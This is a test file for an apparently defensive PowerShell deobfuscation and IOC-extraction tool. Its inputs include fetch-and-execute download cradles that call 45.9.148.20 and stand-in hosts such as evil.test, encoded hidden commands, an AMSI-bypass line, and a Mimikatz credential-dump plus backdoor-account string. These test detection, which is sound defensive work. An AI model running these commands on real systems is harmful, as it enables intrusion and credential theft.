import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('analyze (scaffold)', () => {
  it('returns a shaped AnalysisResult for empty input', async () => {
    const r = await analyze('')
    expect(r.input).toBe('')
    expect(r.flags).toEqual([])
    expect(r.layers).toEqual([])
    expect(r.iocs).toEqual([])
    expect(r.signals).toEqual([])
    expect(r.characterization).toBeNull()
    expect(r.bullets).toEqual([])
    expect(typeof r.copyText).toBe('string')
    expect(r.confidence.state).toBe('fully-decoded')
  })
})

describe('analyze — end to end (depth 1)', () => {
  const ENC = 'SQBFAFgAIAAnAGgAaQAnAA==' // "IEX 'hi'"

  it('decodes a -enc command into a layer and reports the flags', async () => {
    const r = await analyze(`powershell -nop -w hidden -enc ${ENC}`)
    expect(r.flags.map((f) => f.flag).sort()).toEqual(['-enc', '-nop', '-w'])
    expect(r.layers[0].transform).toMatch(/UTF-16LE/)
    expect(r.layers[0].text).toBe("IEX 'hi'")
    expect(r.layers[0].state).toBe('fully-decoded')
  })

  it('extracts a URL from a plain download cradle and defangs it in copyText', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.iocs.map((i) => i.raw)).toContain('http://45.9.148.20/a.ps1')
    // Note: aligned to the app's real defang() output, which brackets EVERY dot
    // (not just the ones in the host) — see shared/verdict/doctrine.ts `defang`.
    expect(r.copyText).toContain('hxxp://45[.]9[.]148[.]20/a[.]ps1')
    expect(r.copyText).toContain('NOT executed')
  })

  it('is deterministic (ignoring checkedAt)', async () => {
    const strip = (r: Awaited<ReturnType<typeof analyze>>) => ({ ...r, checkedAt: '' })
    expect(strip(await analyze(`-enc ${ENC}`))).toEqual(strip(await analyze(`-enc ${ENC}`)))
  })

  it('does not crash on a malformed -enc payload — surfaces it as opaque', async () => {
    const r = await analyze('powershell -nop -enc AAAAAAAAA') // 9 chars — not a multiple of 4
    expect(r.layers).toHaveLength(1)
    expect(r.layers[0].state).toBe('opaque')
    expect(r.layers[0].text).toBeNull()
    expect(r.confidence.state).toBe('partial')
  })
})

describe('analyze — deobfuscation (Phase 2a)', () => {
  async function gzipB64(text: string): Promise<string> {
    const cs = new CompressionStream('gzip')
    const bytes = new Uint8Array(await new Response(new Blob([new TextEncoder().encode(text)]).stream().pipeThrough(cs)).arrayBuffer())
    let bin = ''; for (const b of bytes) bin += String.fromCharCode(b)
    return btoa(bin)
  }
  function encB64(text: string): string {
    const bytes = new Uint8Array(text.length * 2)
    for (let i = 0; i < text.length; i++) { bytes[i * 2] = text.charCodeAt(i) & 0xff; bytes[i * 2 + 1] = (text.charCodeAt(i) >> 8) & 0xff }
    let bin = ''; for (const b of bytes) bin += String.fromCharCode(b)
    return btoa(bin)
  }

  it('resolves a concatenation-obfuscated cradle and extracts its IOC', async () => {
    const r = await analyze("$u = 'http://ev'+'il.test'+'/a.ps1' ; IEX (New-Object Net.WebClient).DownloadString($u)")
    expect(r.iocs.map((i) => i.raw)).toContain('http://evil.test/a.ps1')
  })
  it('caps recursion and never hangs on self-referential input', async () => {
    // must return (not hang) and keep the layer chain bounded
    const r = await analyze("$x = 'IEX $x' ; IEX $x")
    expect(r).toBeDefined()
    expect(r.layers.length).toBeLessThan(10)
  })

  it('extracts IOCs from every decode layer, not just the last (dual-stage)', async () => {
    const inner = "IEX (New-Object Net.WebClient).DownloadString('http://stage1.test/y')"
    const gz = await gzipB64(inner)
    const outer = `iwr http://stage0.test/x ; IEX ([IO.StreamReader](New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('${gz}'),1))).ReadToEnd()`
    const r = await analyze(`powershell -enc ${encB64(outer)}`)
    const raws = r.iocs.map((i) => i.raw)
    expect(raws).toContain('http://stage0.test/x') // layer-1 (-enc) IOC — was lost before the fix
    expect(raws).toContain('http://stage1.test/y') // layer-2 (inflate) IOC
    // layerIndex points at the true AnalysisResult.layers entry
    expect(r.iocs.find((i) => i.raw === 'http://stage0.test/x')?.layerIndex).toBe(0)
    expect(r.iocs.find((i) => i.raw === 'http://stage1.test/y')?.layerIndex).toBe(1)
  })

  it('does not add a resolve layer when nothing was folded or substituted', async () => {
    const clean = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    const r = await analyze(`powershell -enc ${encB64(clean)}`)
    expect(r.layers.some((l) => /resolve/i.test(l.transform))).toBe(false)
    expect(r.iocs.map((i) => i.raw)).toContain('http://x.test/a') // IOC still surfaces
  })
})

describe('analyze — inflate plausibility', () => {
  async function deflateRawB64(bytes: Uint8Array): Promise<string> {
    const cs = new CompressionStream('deflate-raw')
    const out = new Uint8Array(await new Response(new Blob([bytes]).stream().pipeThrough(cs)).arrayBuffer())
    let bin = ''; for (const b of out) bin += String.fromCharCode(b)
    return btoa(bin)
  }

  it('rejects an inflate that decompresses to binary garbage (U+FFFD-heavy)', async () => {
    // 0x80-0xBF are lone UTF-8 continuation bytes → each decodes to U+FFFD.
    const garbage = new Uint8Array(200)
    for (let i = 0; i < garbage.length; i++) garbage[i] = 0x80 + (i % 0x40)
    const b64 = await deflateRawB64(garbage)
    const r = await analyze(`$data = '${b64}'`)
    // The blob raw-inflates successfully but to non-text; no inflate layer may be pushed.
    expect(r.layers.some((l) => /inflate/i.test(l.transform))).toBe(false)
  })

  it('accepts a genuinely-printable inflate (roundtrip sanity)', async () => {
    // relies on Task 5 of Phase 1's inflate; a real gzip of PS text is printable
    const cs = new CompressionStream('gzip')
    const bytes = new Uint8Array(await new Response(new Blob([new TextEncoder().encode("IEX 'hi'")]).stream().pipeThrough(cs)).arrayBuffer())
    const b64 = btoa(String.fromCharCode(...bytes))
    const r = await analyze(`$s='${b64}'; IEX ([IO.StreamReader](New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String($s),1))).ReadToEnd()`)
    // the gzip blob is a quoted literal → layer-2 inflate should fire and be accepted (printable)
    expect(r.layers.some((l) => l.transform === 'Base64 → inflate' && (l.text ?? '').includes("IEX 'hi'"))).toBe(true)
  })
})

describe('analyze — signals in copyText (Phase 3)', () => {
  it('lists behaviour signals and the characterization line in copyText', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.copyText).toContain('High-confidence malicious behaviour')
    expect(r.copyText).toContain('Behaviour signals:')
    expect(r.copyText).toContain('download cradle')
  })

  it('a plain download cradle lists the signal but no characterization line', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(r.copyText).toContain('download cradle')
    expect(r.copyText).not.toContain('High-confidence malicious behaviour')
  })
})

describe('copyText — decoded script + base specificity (quick wins)', () => {
  const encCradle =
    'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
  it('includes the decoded script text, not just transform labels', async () => {
    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
    expect(r.copyText).toMatch(/Decoded script:/)
    expect(r.copyText).toContain('DownloadString') // the real decoded payload
  })
  it('lists each signal at its BASE specificity, consistent with the characterization gate', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.copyText).toContain('[strong] download cradle')
    expect(r.copyText).not.toContain('[near-dispositive] download cradle')
  })
})

describe('analyze — bullets wiring (Phase 4)', () => {
  const encCradle =
    'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='

  it('a -enc download cradle yields decode → fetch → execute bullets, in that order', async () => {
    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
    expect(r.bullets.length).toBeGreaterThanOrEqual(3)
    expect(r.bullets[0].text).toContain('Base64 -EncodedCommand')
    expect(r.bullets.some((b) => b.text.includes('Downloads content from'))).toBe(true)
    expect(r.bullets.some((b) => b.text.includes('Executes the downloaded content in memory'))).toBe(true)
  })

  it('copyText includes a "What it did" section listing the confident bullets', async () => {
    const r = await analyze('powershell -nop -w hidden -enc ' + encCradle)
    expect(r.copyText).toContain('What it did:')
    expect(r.copyText).toContain('Downloads content from')
  })

  it('an unresolved fetch target degrades the Downloads bullet to inferred confidence', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString($u)")
    const b = r.bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('inferred')
  })
})

describe('copyText — opaque bullets get parity with the UI (whole-branch review M1, minor)', () => {
  it('includes a "Could not resolve" section listing opaque bullets, matching ActionBullets.tsx\'s separate block — never merged into the confident "What it did" section', async () => {
    const r = await analyze('wscript //E:vbscript C:\\Users\\Public\\payload.vbs')
    expect(r.copyText).toContain('Could not resolve:')
    expect(r.copyText).toContain('numeric char-code decode only')
    // still never promoted into the confident section (D3/D6)
    const whatItDidIdx = r.copyText.indexOf('What it did:')
    const couldNotResolveIdx = r.copyText.indexOf('Could not resolve:')
    const whatItDidSection = whatItDidIdx === -1 ? '' : r.copyText.slice(whatItDidIdx, couldNotResolveIdx === -1 ? undefined : couldNotResolveIdx)
    expect(whatItDidSection).not.toContain('numeric char-code decode only')
  })
})

describe('analyze — failure legibility (residue)', () => {
  it('a plain-base64 blob that decodes to non-text renders an opaque partial, never blank (Phase 2: a blob that decodes to legible text is now a real layer — see review 2.1 below; this is the genuinely-undecodable case)', async () => {
    // 0x80-0xBF are lone UTF-8 continuation bytes -> each decodes to U+FFFD, and
    // there's no NUL at any odd index, so neither the UTF-8 nor UTF-16LE sniff
    // yields printable text -> stays honestly opaque, never a fabricated layer.
    const garbage = new Uint8Array(40)
    for (let i = 0; i < garbage.length; i++) garbage[i] = 0x80 + (i % 0x40)
    const b64 = btoa(String.fromCharCode(...garbage))
    const r = await analyze(`IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64}')))`)
    expect(r.confidence.state).toBe('partial')
    expect(r.layers.some((l) => l.state === 'opaque')).toBe(true)
    expect(r.bullets.some((b) => b.confidence === 'opaque')).toBe(true)
  })
  it('benign admin work stays fully-decoded and silent', async () => {
    const r = await analyze('Get-ChildItem -Recurse | Where Length -gt 1MB | Sort | Select')
    expect(r.confidence.state).toBe('fully-decoded')
    expect(r.layers.some((l) => l.state === 'opaque')).toBe(false)
  })
  it('a construct resolve() fully folds with NO prior decode layer does not falsely flag as unresolved (whole-branch review finding 1)', async () => {
    // No -enc, no interpreter reentry, no embedded base64 blob -> layers is
    // empty going into the resolve loop, so the resolve-loop's layer push
    // (gated on layers.length being already nonzero) never fires. Before the
    // fix, detectResidue() was fed the STALE pre-resolve text (which still
    // contains the [char]/-join construct) and wrongly flagged this
    // fully-decodable input as unresolved.
    const r = await analyze("IEX (([char]73,[char]69,[char]88) -join '')")
    expect(r.confidence.state).toBe('fully-decoded')
    expect(r.layers.some((l) => l.state === 'opaque')).toBe(false)
    expect(r.bullets.some((b) => b.confidence === 'opaque')).toBe(false)
  })
  it('a variable-subject reversal/-join construct with no [char] literal is flagged opaque, not silently blank (whole-branch review finding 2)', async () => {
    // $s is never bound to a literal, so resolve() intentionally leaves the
    // reversal/-join idiom unfolded (real, honest unresolvability) — this
    // must render as an opaque partial, never as a clean, signal-less pass.
    const r = await analyze("IEX ($s[-1..-3] -join '')")
    expect(r.confidence.state).toBe('partial')
    expect(r.layers.some((l) => l.state === 'opaque')).toBe(true)
    expect(r.bullets.some((b) => b.confidence === 'opaque')).toBe(true)
  })
})

describe('analyze — plain base64 inner stage (review 2.1)', () => {
  it('decodes a non-compressed base64 blob to text and characterizes it', async () => {
    const b64 = btoa('Invoke-Mimikatz -DumpCreds; net user hacker P@ss /add')
    const r = await analyze(`IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64}')))`)
    expect(r.layers.some((l) => /Base64 → text/.test(l.transform) && (l.text ?? '').includes('Invoke-Mimikatz'))).toBe(true)
    expect(r.confidence.state).toBe('fully-decoded')
  })
})

describe('analyze — input size cap (review 2.6)', () => {
  it('caps a huge paste and reports truncation honestly', async () => {
    const huge = 'A'.repeat(70_000)
    const r = await analyze(huge)
    expect(r.layers.some((l) => l.state === 'opaque' && /truncated/i.test(l.residual?.note ?? ''))).toBe(true)
  })

  it('flips confidence.state to partial when truncated', async () => {
    const huge = 'Write-Host ' + 'A'.repeat(70_000)
    const r = await analyze(huge)
    expect(r.confidence.state).toBe('partial')
  })

  it('does not truncate input at or under the 64 KB cap', async () => {
    const atCap = 'A'.repeat(64 * 1024)
    const r = await analyze(atCap)
    expect(r.layers.some((l) => /truncated/i.test(l.residual?.note ?? ''))).toBe(false)
  })

  it('leaves a normal-sized paste completely unaffected', async () => {
    const r = await analyze('Get-ChildItem -Recurse | Where Length -gt 1MB | Sort | Select')
    expect(r.layers.some((l) => /truncated/i.test(l.residual?.note ?? ''))).toBe(false)
    expect(r.confidence.state).toBe('fully-decoded')
  })
})
